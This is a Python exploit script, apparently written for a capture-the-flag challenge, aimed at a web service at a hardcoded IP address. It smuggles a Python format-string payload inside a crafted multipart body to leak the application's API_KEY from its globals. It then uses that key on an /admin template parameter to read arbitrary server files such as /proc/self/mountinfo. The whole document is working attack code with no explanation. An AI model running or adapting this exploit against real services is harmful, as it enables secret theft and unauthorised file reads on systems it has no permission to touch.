
import httpx
import sys

# 远程目标
TARGET = "http://223.6.249.127:12560"
# 如果用本地测试
# TARGET = "http://127.0.0.1:5000"

BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = fmt_payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    try:
        print("[*] Leaking API_KEY...")
        r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=5.0)
        return r.text.strip()
    except Exception as e:
        print(f"[-] Failed to get API Key: {e}")
        return None

def check_file(api_key, path):
    print(f"\n[*] Checking: {path}")
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=5.0)
        if r.status_code == 200:
            print(f"[!] SUCCESS! Status 200")
            print("-" * 30)
            # Limit output length
            content = r.text.strip()
            print(content)
            print("-" * 30)
            return True
        elif r.status_code == 404:
            print("[-] 404 Not Found")
        elif r.status_code == 403:
            print("[-] 403 Forbidden")
        else:
            print(f"[-] Status Code: {r.status_code}")
            print(r.text[:200])
    except Exception as e:
        print(f"[-] Error: {e}")
    return False

def main():
    print(f"[*] Target: {TARGET}")
    api_key = get_api_key()
    if not api_key or "unauth" in api_key:
        print("[-] API Key fetch failed or invalid")
        return
    print(f"[+] API_KEY: {api_key}")

    # Files to check
    files = [
        "/proc/self/mountinfo",
    ]

    for f in files:
        check_file(api_key, f)

if __name__ == "__main__":
    main()
